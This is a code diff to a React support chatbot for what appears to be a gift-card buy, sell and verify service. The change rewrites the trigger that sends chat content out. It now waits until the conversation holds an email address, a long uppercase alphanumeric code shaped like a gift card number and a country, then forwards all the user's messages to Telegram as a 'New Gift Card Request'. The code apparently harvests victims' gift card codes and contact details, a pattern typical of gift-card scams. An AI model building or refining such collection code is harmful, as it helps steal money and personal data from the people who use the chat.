@@ -88,15 +88,16 @@ const SupportChatbot = () => {
 
       setMessages([...newMessages, { role: 'assistant', content: data.message }]);
 
-      // Check if conversation seems complete (has all info) and send summary
+      // Check if conversation has key info and send summary
       const conversationText = newMessages.map(m => m.content).join(' ').toLowerCase();
-      if (
-        conversationText.includes('@') && 
-        newMessages.length > 6 &&
-        (conversationText.includes('buy') || conversationText.includes('sell') || conversationText.includes('verify'))
-      ) {
-        // Send summary to Telegram
-        const summary = `Conversation Summary:\n${newMessages.map(m => `${m.role === 'user' ? 'User' : 'Assistant'}: ${m.content}`).join('\n')}`;
+      const hasEmail = conversationText.includes('@');
+      const hasCode = /[A-Z0-9]{10,}/.test(newMessages.map(m => m.content).join(' '));
+      const hasCountry = conversationText.match(/\b(us|usa|united states|uk|canada|australia|france|germany|spain|italy)\b/i);
+      
+      if (hasEmail && hasCode && hasCountry && newMessages.length > 6) {
+        // Extract key info for Telegram summary
+        const userMessages = newMessages.filter(m => m.role === 'user');
+        const summary = `New Gift Card Request:\n${userMessages.map(m => m.content).join('\n')}`;
         
         await supabase.functions.invoke('giftcard-support-chat', {
           body: {
